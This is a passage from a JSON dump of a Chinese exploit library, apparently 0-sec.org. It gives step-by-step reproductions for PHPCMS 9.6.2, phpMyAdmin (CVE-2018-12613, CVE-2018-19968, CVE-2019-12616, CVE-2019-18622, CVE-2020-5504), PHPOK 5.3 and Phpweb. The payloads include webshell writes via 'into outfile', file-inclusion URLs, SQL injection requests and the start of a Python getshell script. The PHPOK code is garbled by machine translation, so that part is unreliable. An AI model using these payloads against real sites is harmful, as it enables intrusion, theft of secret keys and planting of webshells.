YDVIB_att_json:ea6fUlmiupVPoK2udMAztI7dpqUURRW1plemEGmRhGPocAvwWbcMk3BARFHzxLI4NJrV1IJQ2PaHeec790iDdhRJ9dJbhEKamgM55SwKR-F3fFmmWDOVuHnyiWg9kyMzQ2l9D_cRPQmM7P9e7ZYrESNQwjMOytrFTIhY4SFmK2Vjc3GS3g 第三步:将GET请求中的a_k参数的值设置为第二步请求获得的YDVIB_att_json参数的值，并进行如下请求。 请求： [get] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=init&a_k=41f4VsAhLvN8-4L1ntgSsuga4BrvYA5zcDo2bjiYB7RI98Qzj5D5k8dqqBfo7cUNwF3TGhz1SH-vPs3lIIQJYwHeF_u2b3QVfD2HIO3Gay68TAtz2rqYhX8XIeznWrTtOI24418KZUoTEAfnY4kZNtIajW-bqHRV1djqmEc1hSAwkIYWA9CPrw 获得： http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=download&a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM 最后点击”点击下载”的按钮进行如下请求，便可以下载/caches/configs/system.php文件，得到里面的’auth_key’ http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=download&a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM 参考链接 https://www.freebuf.com/column/158352.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 11:50:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpmyadmin/CVE-2018-12613.html":{"url":"0day/Phpmyadmin/CVE-2018-12613.html","title":"（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞","keywords":"","body":"（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞 一、漏洞简介 二、漏洞影响 phpMyAdmin 4.8.0和4.8.1受到影响。 三、复现过程 首先需要登录phpmyadmin payload http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../phpStudy/使用说明.txt 写入shell 第一种姿势 1、写入shell，测试语句： SELECT '' 2、查看自己的sessionid（cookie中phpMyAdmin的值）。(或者Bp抓包获取本地的cookie值也可以) 补充代码 如果上述方法不行的话，则用以下代码 select '' into outfile '/var/www/shell.php' 3、访问： http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../../../phpStudy/tmp/tmp/sess_20f18hqcr2mc0nmq96vp920r6phc06v3 第二种姿势 1、在数据表里面添加一句话(这里一点要用get！) 2、此时会在phpStudyMySQLdata 对应数据库下生成一个frm文件（不同版本路径可能不一样） 3、访问 http://0-sec.org/index.php?9ouu=phpinfo();&target=db_sql.php%253f/../../../../../../phpStudy/MySQL/data/9ouu/test.frm 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-25 10:59:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpmyadmin/CVE-2018-19968.html":{"url":"0day/Phpmyadmin/CVE-2018-19968.html","title":"（CVE-2018-19968）Phpmyadmin 文件包含漏洞","keywords":"","body":"（CVE-2018-19968）Phpmyadmin 文件包含漏洞 一、漏洞简介 Transformation是phpMyAdmin中的一个高级功能，通过Transformation可以对每个字段的内容使用不同的转换，每个字段中的内容将被预定义的规则所转换。比如我们有一个存有文件名的字段 ‘Filename’，正常情况下 phpMyAdmin 只会将路径显示出来。但是通过Transformation我们可以将该字段转换成超链接，我们就能直接在 phpMyAdmin 中点击并在浏览器的新窗口中看到这个文件。 通常情况下Transformation的规则存储在每个数据库的pma__column_info表中，而在phpMyAdmin 4.8.0~4.8.3版本中，由于对转换参数处理不当，导致了任意文件包含漏洞的出现。 二、漏洞影响 Phpmyadmin 4.8.0~4.8.3 三、复现过程 1、首先登陆进后台，这里默认是root, toor 2、创建数据库，并将PHP代码写入SESSION文件中 CREATE DATABASE foo; CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY ); INSERT INTO foo.bar SELECT ''; 访问http://www.0-sec.org/chk_rel.php?fixall_pmadb=1&db=foo在数据库foo中生成phpMyAdmin的配置表。 将篡改后的Transformation数据插入表pma_columninfo中将sess中的替换成你的会话ID，即COOKIE中phpMyAdmin的值，抓包查看session id，如下 INSERT INTO pma__column_info SELECT '1', 'foo', 'bar', 'baz', 'plop', 'plop', 'plop', 'plop', '../../../../../../../../tmp/sess_***','plop'; \\#将sess_***中的***替换成你的会话ID，即COOKIE中phpMyAdmin的值 然后访问 http://www.0-sec.org/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1 就能自动包含刚才插入数据库表的恶意代码 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 17:29:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpmyadmin/CVE-2019-12616.html":{"url":"0day/Phpmyadmin/CVE-2019-12616.html","title":"（CVE-2019-12616）Phpmyadmin CSRF","keywords":"","body":"（CVE-2019-12616）Phpmyadmin CSRF 一、漏洞简介 4.9.0之前在phpmyadmin中发现了一个问题。发现一个漏洞，允许攻击者对phpMyAdmin用户触发CSRF攻击。攻击者可以欺骗用户。 例如通过指向受害者的phpMyAdmin数据库的一个损坏的标记，并且攻击者可以潜在地将有效负载（例如特定的插入或删除语句）传递给受害者。 二、漏洞影响 Phpmyadmin 三、复现过程 GET http://www.0-sec.org:9000/tbl_sql.php?sql_query=INSERT+INTO+%60pma__bookmark%60+(%60id%60%2C+%60dbase%60%2C+%60user%60%2C+%60label%60%2C+%60query%60)+VALUES+(DAYOFWEEK(%27%27)%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27)&show_query=1&db=phpmyadmin&table=pma__bookmark HTTP/1.1 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Connection: keep-alive Cookie: pmaCookieVer=5; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci; pmaUser-1=%7B%22iv%22%3A%22M16ZzlA0rqF9BZ1jFsssjQ%3D%3D%22%2C%22mac%22%3A%22804941d12fceca0997e181cbcb8427d68c668240%22%2C%22payload%22%3A%22mD9juTxAYhC7lA7XPWHWOw%3D%3D%22%7D; phpMyAdmin=9bdd66557e399fc1447bf253bc2dc133 Upgrade-Insecure-Requests: 1 Host: localhost:9000 攻击者可以很容易地创建一个假超链接，其中包含希望代表用户执行的请求，这样就可能由于错误地使用http方法而导致csrf攻击 #POC POC CVE-2019-12616 View my Pictures! 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 17:17:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpmyadmin/CVE-2019-18622.html":{"url":"0day/Phpmyadmin/CVE-2019-18622.html","title":"（CVE-2019-18622）Phpmyadmin xss","keywords":"","body":"（CVE-2019-18622）Phpmyadmin xss 一、漏洞简介 官方公布的是sql注入漏洞，但是实际是xss漏洞 二、漏洞影响 Phpmyadmin 三、复现过程 漏洞分析 首先看官方修复的方式： 如上图，先关注/js/designer/move.js文件，可以看到单纯的修改了取值方式，最终的值通过POST 方式提交到db_desingner.php文件，关键内容如下： if (isset($_POST['dialog'])) { .... } elseif ($_POST['dialog'] == 'add_table') { // Pass the db and table to the getTablesInfo so we only have the table we asked for $script_display_field = $designerCommon->getTablesInfo($_POST['db'], $_POST['table']); ... } 传到了getTablesInfo()函数中，该函数内容主要如下： public function getTablesInfo($db = null, $table = null) { ..... foreach ($tables as $one_table) { $DF = $this->relation->getDisplayField($db, $one_table['TABLE_NAME']); $DF = is_string($DF) ? $DF : ''; $DF = ($DF !== '') ? $DF : null; $designerTables[] = new DesignerTable( $db, $one_table['TABLE_NAME'], $one_table['ENGINE'], $DF ); } return $designerTables; } 跟进getDisplayField()，内容如下： public function getDisplayField($db, $table) { $cfgRelation = $this->getRelationsParam(); /** * Try to fetch the display field from DB. */ if ($cfgRelation['displaywork']) { $disp_query = ' SELECT `display_field` FROM ' . Util::backquote($cfgRelation['db']) . '.' . Util::backquote($cfgRelation['table_info']) . ' WHERE `db_name` = \\'' . $GLOBALS['dbi']->escapeString($db) . '\\' AND `table_name` = \\'' . $GLOBALS['dbi']->escapeString($table) . '\\''; $row = $GLOBALS['dbi']->fetchSingleRow( $disp_query, 'ASSOC', DatabaseInterface::CONNECT_CONTROL ); if (isset($row['display_field'])) { return $row['display_field']; } } .... 通过escapeString过滤 table 名，查看该过滤函数： public function escapeString($link, $str) { return mysql_real_escape_string($str, $link); } 引入了mysql_real_escape_string()函数 这个函数类似于addslashes()函数，当编码不当的时候，可能导致宽字节注入 但真的那么简单吗？继续往下看 这里获得的table_name 参数会传入以下语句： SELECT *, `COLUMN_NAME` AS `Field`, `COLUMN_TYPE` AS `Type`, `COLLATION_NAME` AS `Collation`, `IS_NULLABLE` AS `Null`, `COLUMN_KEY` AS `Key`, `COLUMN_DEFAULT` AS `Default`, `EXTRA` AS `Extra`, `PRIVILEGES` AS `Privileges`, `COLUMN_COMMENT` AS `Comment` FROM `information_schema`.`COLUMNS` WHERE `TABLE_SCHEMA` = 'day1' AND `TABLE_NAME` = '$table_name'; 这里的$table_name在 db_designer.php中可控，然而当环境准备好，语句配置好后，却出现了以下错误： JSON encoding failed: Malformed UTF-8 characters, possibly incorrectly encoded 提示是因为编码问题，因此我们重新将 payload url 编码后再传入： 这次无误，查看执行的语句： %df%27并没有按照我们想法闭合单引号，到底是什么原因呢？ 在数据库连接的时候，phpmyadmin会将默认的字符格式设置为 utf8mb4，而我们宽字节注入必须要求编码为g bk，因此其实这里不存在宽字节注入。 说明这里的修复对SQL 漏洞并无多大关系（其实从修复文件上看，就知道了），继续看下一处修复。 /templates/database/designer/database_tables.twig处 diff 如下： - {{ designerTable.getTableName()|raw }} + {{ designerTable.getTableName() }} 可以看到，唯一的差别就是删除了|raw，这种写法是Twig模板语言的写法，raw 的作用就是让数据在 autoescape过滤器里失效，可以安装一个 twig 模板看看实例。 composer require \"twig/twig:^3.0\" 运行命令后该目录下会生成2个文件：composer.json、composer.lock以及一个目录vendor 然后在同目录下创建文件夹templates、tmp 进入templates目录下创建index.html.twig文件，内容如下 twig test {{ name |raw}} {{ name }} 根目录下创建index.php，内容如下： require_once 'vendor/autoload.php'; $loader = new \\Twig\\Loader\\FilesystemLoader('templates'); $twig = new \\Twig\\Environment($loader, [ 'cache' => '/Library/WebServer/Documents/twig/tmp', ]); echo $twig->render('index.html.twig', ['name' => 'panda\\' union select 1,2, from a']); 访问index.php可以发现： 单引号被转义成了实体字符 修复的 SQL 漏洞点在这里吗？ 并不是。这里修复的仅仅是前端显示字符串的问题，与后端的 sql 注入也并无关系。 前文中提到的move.js修复的也是前端的内容，其实也和后端的 sql 注入并无关系。 那么这个修复方式和 sql 注入到底是什么关系呢？ 可能没关系吧。 考虑到该修复内容全部为前端的内容，于是将表名改为 XSS 的 payload： alert(0) 果然，和当初想的一样，触发了 XSS 漏洞。 然后看v4.9.2版本的 phpmyadmin： 转义成实体字符，无法触发 XSS 攻击 payload 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-21 23:58:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpmyadmin/CVE-2020-5504.html":{"url":"0day/Phpmyadmin/CVE-2020-5504.html","title":"（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞","keywords":"","body":"（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞 一、漏洞简介 在用户帐户页面中发现了一个SQL注入漏洞。创建对此页面的查询时，恶意用户可能会注入自定义SQL来代替其自己的用户名。攻击者必须具有有效的MySQL帐户才能访问服务器。 二、漏洞影响 Phpmyadmin Phpmyadmin 三、复现过程 环境搭建 docker一把梭 docker run --name mysql5.6 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6 `docker run --name myadmin -d --link mysql5.7:db -p 8080:80 phpmyadmin/phpmyadmin:5.0 溯源和构造poc 下载前一个版本 5.0.0的代码压缩包后, 打开libraries/classes/Server/Privileges.php 来到对应行. if (isset($_GET['validate_username'])) { $sql_query = \"SELECT * FROM `mysql`.`user` WHERE `User` = '\" . $_GET['username'] . \"';\"; // 省略 节省篇幅 } 很显然可以看出注入点是$_GET['username'],而需要设置$_GET['validate_username'] 往上看, 这段代码位于public function getExtraDataForAjaxBehavior函数. 搜索上层调用来到/server_privileges.php 的这段代码 if ($response->isAjax() && empty($_REQUEST['ajax_page_request']) && ! isset($_GET['export']) && (! isset($_POST['submit_mult']) || $_POST['submit_mult'] != 'export') && ((! isset($_GET['initial']) || $_GET['initial'] === null || $_GET['initial'] === '') || (isset($_POST['delete']) && $_POST['delete'] === __('Go'))) && ! isset($_GET['showall']) && ! isset($_GET['edit_user_group_dialog']) ) { $extra_data = $serverPrivileges->getExtraDataForAjaxBehavior( (isset($password) ? $password : ''), (isset($sql_query) ? $sql_query : ''), (isset($hostname) ? $hostname : ''), (isset($username) ? $username : '') ); if (! empty($message) && $message instanceof Message) { $response->setRequestStatus($message->isSuccess()); $response->addJSON('message', $message); $response->addJSON($extra_data); exit; } } 可以发现if里大部分条件都可控, 除了$response->isAjax() public function isAjax(): bool { return $this->_isAjax; } 查看构造函数 /** * Creates a new class instance */ private function __construct() { if (! defined('TESTSUITE')) { $buffer = OutputBuffering::getInstance(); $buffer->start(); register_shutdown_function([$this, 'response']); } $this->_header = new Header(); $this->_HTML = ''; $this->_JSON = []; $this->_footer = new Footer(); $this->_isSuccess = true; $this->_isDisabled = false; $this->setAjax(! empty($_REQUEST['ajax_request'])); $this->_CWD = getcwd(); } 可以看到这条件在于$_REQUEST['ajax_request']是否为空. 根据上面的几个条件 我们可以构造出如下最简单的poc http://127.0.0.1:8080/server_privileges.php?ajax_request=true&validate_username=true&username=test%27%22 登陆后(这个操作需要权限) 尝试访问上面的url.返回如下 {\"success\":false,\"error\":\"ErrorStatic analysis:1 errors were found during analysis.Ending quote \\\" was expected. (near \\\"\\\" at position 53)SQL query: Copy\\n&nbsp;Edit \\n\\nSELECT * FROM `mysql`.`user` WHERE `User` = 'test'&quot;';\\n\\n\\n MySQL said: \\n\\n#1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;'' at line 1\"} 一个sql报错信息, 说明这个最短poc生效了 利用的话 反正都回显了 直接updatexml报错注入 http://127.0.0.1:8080/server_privileges.php?ajax_request=true&validate_username=true&username=test%27%20and%20(select%20updatexml(1,concat(0x7e,(SELECT%20@@version),0x7e),1))%20--%20 在返回最下面可以看到#1105 - XPATH syntax error: '~5.6.46~' 后言 这个洞要求一个可以登录的账号才能注入. , 另外这个请求似乎也不需要csrf-token(不过似乎没什么用) 参考链接 https://xz.aliyun.com/t/7092 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 00:00:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PHPOK/1.html":{"url":"0day/PHPOK/1.html","title":"PHPOK 5.3 前台注入","keywords":"","body":"PHPOK 5.3 前台注入 一、漏洞简介 二、漏洞影响 PHPOK 5.3 三、复现过程 漏洞分析 灵活获取参数：$this->get()方法 framework / init.php＃get 最后的公共函数get（$ id，$ type =“ safe”，$ ext =“”） { // PGC进入获取 $ val = isset（$ _ POST [$ id]）？$ _POST [$ id]：（isset（$ _ GET [$ id]）？$ _GET [$ id]：（isset（$ _ COOKIE [$ id]）？$ _COOKIE [$ id]：''））; if（$ val ==''）{ if（$ type =='int'|| $ type =='intval'|| $ type =='float'|| $ type =='floatval'）{ 返回0 ; } else { return”; } } //判断内容是否有转义，所有未转义的数据都直接转义 $ addslashes = false; if（function_exists（“ get_magic_quotes_gpc”）&& get_magic_quotes_gpc（））{ $ addslashes = true; } if（！ $ addslashes）{ $ val = $ this-> _ addslashes（$ val）; } 返回$ this-> format（$ val，$ type，$ ext）; } 跟进format函数：framework / init.php＃format 最终的公共函数格式（$ msg，$ type =“ safe”，$ ext =“”） { if（$ msg ==“”）{ return ;; } if（is_array（$ msg））{ foreach（$ msg as $ key => $ value）{ if（！is_numeric（$ key））{ $ key2 = $ this-> format（$ key）; if（$ key2 ==``|| in_array（$ key2，array（'＃'，'＆'，'％'）））{ unset（$ msg [$ key]）; 继续; } } $ msg [$ key] = $ this-> format（$ value，$ type，$ ext）; } if（$ msg && count（$ msg）> 0）{ 返回$ msg; } 返回false; } if（$ type =='html_js'||（$ type =='html'&& $ ext））{ $ msg = stripslashes（$ msg）; if（$ this-> app_id！='admin'）{ $ msg = $ this-> lib（'string'）-> xss_clean（$ msg）; } $ msg = $ this-> lib（'string'）-> clear_url（$ msg，$ this-> url）; 返回addslashes（$ msg）; } //转义去除 $ msg = stripslashes（$ msg）; //格式化处理内容 开关（$ type）{ case'safe_text'： $ msg = strip_tags（$ msg）; $ msg = str_replace（array（“ \\\\”，“'”，'“'，” “），''，$ msg）; break; 情况'system'： $ msg =！preg_match（“ / ^ [a-zA-Z] [a-z0-9A-Z \\ _ \\-] + $ / u”，$ msg）吗？false：$ msg; 打破; 情况'id'： $ msg =！preg_match（“ / ^ [a-zA-Z] [a-z0-9A-Z \\ _ \\-] + $ / u”，$ msg）吗？false：$ msg; 打破; 情况'复选框'： $ msg = strtolower（$ msg）=='on'吗？1：$ this-> format（$ msg，'safe'）; 打破; 情况'int'： $ msg = intval（$ msg）; 打破; 情况'intval'： $ msg = intval（$ msg）; 打破; 情况'float'： $ msg = floatval（$ msg）; 打破; 情况'floatval'： $ msg = floatval（$ msg）; 打破; 案例“时间”： 打破; 情况'html'： $ msg = $ this-> lib（'string'）-> safe_html（$ msg，$ this-> url）; 打破; 情况'func'： $ msg = function_exists（$ ext）？$ ext（$ msg）：假; 打破; 情况'text'： $ msg = strip_tags（$ msg）; 打破; 默认值： $ msg = str_replace（array（“ \\\\”，“'”，'“'，” “），array（”＆＃92;“，”＆＃39;“，”＆quot; “，”＆lt;“，”＆gt;“），$ msg）; break; } if（$ msg）{ $ msg =加上斜线（$ msg）; } 返回$ msg; } 格式默认为安全模式，也就是仅将\\ \" ' 实体编码。 注入点： framework / api / index_control.php＃phpok_f // ... $ token = $ this-> get（“ token”）; if（！$ token）{ $ this-> json（P_Lang（“接口数据异常”））;; } $ this-> lib（'token'）-> keyid（$ this-> site ['api_code']）; $ info = $ this-> lib（'token'）-> decode（$ token）; if（！$ info）{ $ this-> json（P_Lang（'信息为空'））; } $ id = $ info ['id']; // 176行 $ ext = $ this-> get（'ext'）; if（$ ext && is_array（$ ext））{ foreach（$ ext as $ key => $ value）{ if（！$ value）{ 继续； } // sqlext变量转义取消 if（$ key =='sqlext'&& $ value）{ $ value = str_replace（array（'＆＃39;'，'“”，'’''，'＆＃34 ;'），array（“'”，'“'，”'“，'”'），$ value）; } $ param [$ key] = $ value; } } // $ id从加密的令牌中来 /// sqlsql的值的函数只有_userlist，_arc_condition_single，_arc_condition $ list = $ this-> call-> phpok（$ id，$ param）; 继续跟进phpok函数：framework / phpok_call.php＃phpok 公共功能phpok（$ id，$ rs =“”） { // 76行 $ siteinfo = $ this-> model（'site'）-> get_one（$ rs ['site']）; // 91行 if（substr（$ id，0,1）！='_'）{ // $ id从令牌中来，为phpok表中identifier标识符，$ rs ['site']可控为任意值 $ call_rs = $ this-> load_phpoklist（$ id，$ rs ['site']）; } // 116行 $ func ='_'。$ call_rs ['type_id']; // 131行动态调用函数_xxxx return $ this- > $ func（$ call_rs，$ cache_id）; } 跟进load_phpoklist：framework / phpok_call.php＃load_phpoklist 私有函数load_phpoklist（$ id，$ siteid = 0） { $ this-> model（'call'）-> site_id（$ siteid）; if（$ this-> _ cache && $ this-> _ cache [$ id]）{ 返回$ this-> _ cache [$ id]; } $ this-> _ cache = $ this-> model（'call'）-> all（$ siteid，'identifier'）; if（$ this-> _ cache && $ this-> _ cache [$ id]）{ 返回$ this-> _ cache [$ id]; } 返回false; } 这一段代码$this->model('call')->all($siteid,'identifier');实现的是查询phpok表，其中identifier = xxx的信息，然后在phpok()函数的131行进行动态调用其插入为type_id的值函数。 例如我们要调用framework/phpok_call.php下的_arclist函数，我们可以选择： http://0-sec.org/api.php?c=index&f=phpok&ext[site]=1&token=加密('id=m_picplayer') 我们接着在framework/phpok_call.php电子邮件寻找柯林斯触发SQL的函数，从phpok表里我们可以看到其默认的TYPE_ID只有四个不同的值arclist， ，arc，catelist，project我们而需要找到拼接sqlext变量的函数： 框架/ phpok_call.php＃_arclist 私有函数_arclist（$ rs，$ cache_id =''） { // 254行 $ condition = $ this-> _ arc_condition（$ rs，$ flist，$ project）; //带入注入数据 $ array ['total'] = $ this-> model（'list'）-> arc_count（$ project ['module']，$ condition）; } 跟进：framework / phpok_call.php＃_arc_condition 直接拼接了sqlext private function _arc_condition($rs,$fields='',$project='') { // 623行 if($rs['sqlext']){ $condition .= \" AND \".$rs['sqlext']; } // 671行 return $condition; } 接着将结果带入了： $ this-> model（'list'）-> arc_count（$ project ['module']，$ condition）; 调用：framework / model / list.php＃arc_count 5.jpg 拼接sql，调用$this->db->count($sql) framework / engine / db / mysqli.php＃count 公共功能计数（$ sql =“”，$ is_count = true） { if（$ sql && is_string（$ sql）&& $ is_count）{ $ this-> set（'type'，'num'）; $ rs = $ this-> get_one（$ sql）; $ this-> set（'type'，'assoc'）; 返回$ rs [0]; } else { if（$ sql && is_string（$ sql））{ $ this-> query（$ sql）; } if（$ this-> query）{ 返回mysqli_num_rows（$ this-> query）; } } 返回false; } 根进get_one函数：framework / engine / db / mysqli.php＃get_one 公共功能get_one（$ sql =''） { if（$ sql）{ $ false = $ this-> cache_false（$ sql）; if（$ false）{ 返回false; } if（$ this-> cache_get（$ sql））{ 返回$ this-> cache_get（$ sql）; } $ this-> query（$ sql）; 根进$this->query($sql);：framework / engine / db / mysqli.php＃query 最终将sql带入执行。 当然，到这里，其实还有一个问题没有解决，我们需要如果拿到token=加密('id=m_picplayer')。 框架/ API / index_control.php＃token_f { $ this-> config（'is_ajax'，true）; if（！$ this-> site ['api_code']）{ $ this-> error（P_Lang（“系统未配置接口功能”））; } $ id = $ this-> get（'id'，'system'）; if（！$ id）{ $ this-> error（P_Lang（'未指定数据调用标识'））; } $ this-> model（'call'）-> site_id（$ this-> site ['id']）; //限制范围，其中identifier = $ id $ rs = $ this-> model（'call'）-> get_one（$ id，'identifier'）; if（！$ rs ||！$ rs ['status']）{ $ this-> error（P_Lang（'标识不存在或未启用'））; } // 141行 $ array = array（'id'=> $ id，'param'=> $ param）; $ token = $ this-> lib（'token'）-> encode（$ array）; $ this-> success（$ token）; } 其中第一个如果条件需要在后台生成api字符串： 没开启的话，其实构造一个csrf的poc也是可以的 第二个条件预期id=m_picplayer即可 漏洞复现 http://0-sec.org/api.php?c=index&f=token&id=m_picplayer POC： GET /api.php?c=index&f=phpok&token=6318fdtC3WRpOzYNzKVNw78PFa9OhFea5pp3/uZ4U3T67a/F47WhJ0lr856V7yomOcG0u8/UJpIwKKOwJAKspTSWN+5ljVNWR5978g7HHoG14M&ext[sqlext]=sleep(5)%23&ext[site]=1 HTTP/1.1 Host: 0-sec.org Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.86 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Cookie: PHPSESSION=l87bngd1u307g20iudfmphisu4 Connection: close 四、参考链接 https://xz.aliyun.com/t/6830 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 12:27:05 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PHPOK/2.html":{"url":"0day/PHPOK/2.html","title":"PHPOK 5.3 前台无限制注入","keywords":"","body":"PHPOK 5.3 前台无限制注入 一、漏洞简介 二、漏洞影响 PHPOK 5.3 三、复现过程 漏洞分析 注入点：framework/model/list.php#arc_all public function arc_all($project,$condition='',$field='*',$offset=0,$psize=0,$orderby='') { if($this->_total > 100000 && $offset > 10000){ return $this->_arc_all($project,$condition,$field,$offset,$psize,$orderby); } $sql = \" SELECT \".$field.\" FROM \".$this->db->prefix.\"list l \"; $sql .= \" JOIN \".$this->db->prefix.\"list_\".$project['module'].\" ext \"; $sql .= \" ON(l.id=ext.id AND l.site_id=ext.site_id AND l.project_id=ext.project_id) \"; if($project['is_biz']){ $sql .= \" LEFT JOIN \".$this->db->prefix.\"list_biz b ON(b.id=l.id) \"; } if($project['cate'] && $project['cate_multiple']){ $sql.= \" LEFT JOIN \".$this->db->prefix.\"list_cate lc ON(l.id=lc.id) \"; } if($condition){ $sql .= \" WHERE \".$condition.\" \"; } // 拼接$orderby参数 if($orderby){ $sql .= \" ORDER BY \".$orderby.\" \"; } if($psize){ $sql .= \" LIMIT \".intval($offset).\",\".$psize; } //注入 $rslist = $this->db->get_all($sql,'id'); if(!$rslist){ return false; } return $this->_arc_list_format($rslist,$project); } 回溯寻找调用链：framework/phpok_call.php#_arclist private function _arclist($rs,$cache_id='') { // 264行 $orderby = $rs['orderby'] ? $rs['orderby'] : $project['orderby']; // 270行 调用arc_all函数，将$orderby传入 $rslist = $this->model('list')->arc_all($project,$condition,$field,$offset,$psize,$orderby); 回溯：framework/api/project_control.php#load_module private function load_module($rs,$parent_rs='') { // 91行 $keywords = $this->get(\"keywords\"); $ext = $this->get(\"ext\"); $tag = $this->get(\"tag\"); $uid = $this->get('uid','int'); $attr = $this->get('attr'); //价格，支持价格区间 $price = $this->get('price','float'); $sort = $this->get('sort'); //186行 if($sort){ $dt['orderby'] = $sort; // 可控 $pageurl .= '&sort='.rawurlencode($sort); $this->rlist['sort'] = $sort; } // 208行，通过phpok函数动态调用_arclist()函数 $info = $this->call->phpok('_arclist',$dt); 继续回溯，找谁调用了load_module()：framework/api/project_control.php#index_f public function index_f() { //65行 if($project[\"module\"]){ $this->load_module($project,$parent_rs); } } 在控制器里以_f结尾的函数都可以直接被调用 构造poc: http://0-sec.org/api.php?c=project&f=index&token=1234&id=news&sort=(sleep(5)) 漏洞复现 poc GET /api.php?c=project&f=index&token=1234&id=news&sort=(sleep(5)) HTTP/1.1 Host: phpok5_3_147 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3833.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Cookie: PHPSESSION=l87bngd1u307g20iudfmphisu4; XDEBUG_SESSION=PHPSTORM Connection: close 四、参考链接 https://xz.aliyun.com/t/6831 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 14:02:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpweb/Phpweb 前台getshell.html":{"url":"0day/Phpweb/Phpweb 前台getshell.html","title":"Phpweb 前台getshell","keywords":"","body":"Phpweb 前台getshell 一、漏洞简介 漏洞影响文件:/base/post.php /base/appfile.php /base/appplue.php /base/appborder.php 二、漏洞影响 Phpweb 三、复现过程 1.首先要获取加密前的Md5值，用于文件较检,通过Post提交数据来获取! curl \"http://website/base/post.php\" -H \"act=appcode\" ac34c64cdb405eff881efc5476a64761 ##这个就是初始值 2.获取加密后得md5值 然后将初始值md5加密(ac34c64cdb405eff881efc5476a64761 + “a”) 得到加密后的MD5值! e10adc3949ba59abbe56e057f20f883e ##这个就是加密后的md5值(终值)! 3.Getsehll exp: Filename: 然后…Getshell! 当出现OK两个大字时,说明你成功了!!! 上传的shell路径是 http://www.0-sec.org/effect/source/bg/shell名称.php 工具编写 Python exp[Python3]: # -*- coding: UTF-8 -*- # import os import requests import hashlib bdlj = os.getcwd() headers = open(bdlj+\"\\headers.txt\",'r') headerss = headers.read() print('\\b') ur = input(\"请输入目标网址:\") requrl = ur + '/base/post.php' reqdata = {\"act\":\"appcode\"} r = requests.post(requrl,data=reqdata) cz=r.text[2:34] print ('初值:' + cz) cz=r.text[2:34]+\"a\" m = hashlib.md5() b = cz.encode(encoding='utf-8') m.update(b) zz = m.hexdigest() print ('终值:' + zz) infile = open(bdlj + \"\\datas.txt\", 